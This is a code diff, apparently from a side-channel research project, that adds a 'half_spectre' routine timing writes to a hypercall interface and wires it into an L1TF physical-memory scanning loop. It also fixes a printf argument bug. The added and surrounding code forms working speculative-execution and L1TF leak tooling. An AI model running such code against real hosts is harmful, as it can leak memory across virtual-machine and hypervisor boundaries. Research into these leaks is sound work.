@@ -28,6 +28,7 @@
 #pragma GCC diagnostic pop
 
 #include <assert.h>
+#include <hypercall.h>
 
 #define THRESHOLD 150
 
@@ -417,6 +418,45 @@ int l1tf_oracle16_9797_touch(uintptr_t physical_addr, int nr_tries, two_byte_rel
   return hits;
 }
 
+int half_spectre_raw(void *buf, const size_t idx, const size_t iters) {
+  static int fd_sched_yield = -1;
+  if (fd_sched_yield == -1) {
+    fd_sched_yield = open ("/proc/hypercall/sched_yield", O_WRONLY);
+    assert(fd_sched_yield > 0);
+  }
+
+  struct sched_yield_hypercall opts_yield;
+  unsigned int cpu = 0;
+  if (getcpu(&cpu, NULL) == -1) {
+    err(EXIT_FAILURE, "Failed to get CPU");
+  }
+  opts_yield.current_cpu_id = cpu;
+  opts_yield.speculated_cpu_id = idx;
+  opts_yield.ptr = buf;
+
+  int hits = 0;
+  for (size_t i = 0; i < iters; ++i) {
+    ssize_t time = write(fd_sched_yield, &opts_yield, sizeof(opts_yield));
+    assert(time >= 0);
+    if (time < CACHE_HIT_THRESHOLD) {
+      hits++;
+    }
+  }
+
+  return hits;
+}
+
+void half_spectre(unsigned char *p, uintptr_t own_pa, uintptr_t base)
+{
+  for (int delta_p = 0; delta_p <= 0x200; delta_p += 0x200) {
+    for (int delta_off = 0; delta_off <= 0x200; delta_off += 0x200) {
+      uint64_t off = own_pa - base + delta_off;
+      printf("half_spectre | base = %lx | p's pa = %lx | offset = %lx | idx = %lx ", base, own_pa+delta_p, off, off/8);
+      printf("| hits = %d / 10M\n", half_spectre_raw(p + delta_p, off/8, 10000000));
+    }
+  }
+}
+
 void l1tf_find_ffff_values(scan_opts_t scan_opts) {
   initialize_pteditor_lib();
   two_byte_reload_buffer *reload_buffer = aligned_alloc(PAGE_SIZE, sizeof(two_byte_reload_buffer));
@@ -473,7 +513,7 @@ void l1tf_find_ffff_values(scan_opts_t scan_opts) {
   size_t max_runs = 1000;
   for (size_t run = 1; run < max_runs; ++run) {
     if (run % 10 == 0) {
-      printf("\rrun %d");
+      printf("\rrun %ld", run);
       fflush(stdout);
     }
     for (uintptr_t physical_addr = scan_opts.start, i = 0; physical_addr < scan_opts.end; physical_addr += scan_opts.stride, ++i) {
@@ -483,6 +523,8 @@ void l1tf_find_ffff_values(scan_opts_t scan_opts) {
           int hits = l1tf_oracle16_ffff(physical_addr+off, 100, reload_buffer, leak);
           printf("  %18lx: %4d / %4d\n", physical_addr+off, hits, 100);
         }
+        uintptr_t base = physical_addr;
+        half_spectre(p, own_pa, base);
       }
     }
   }
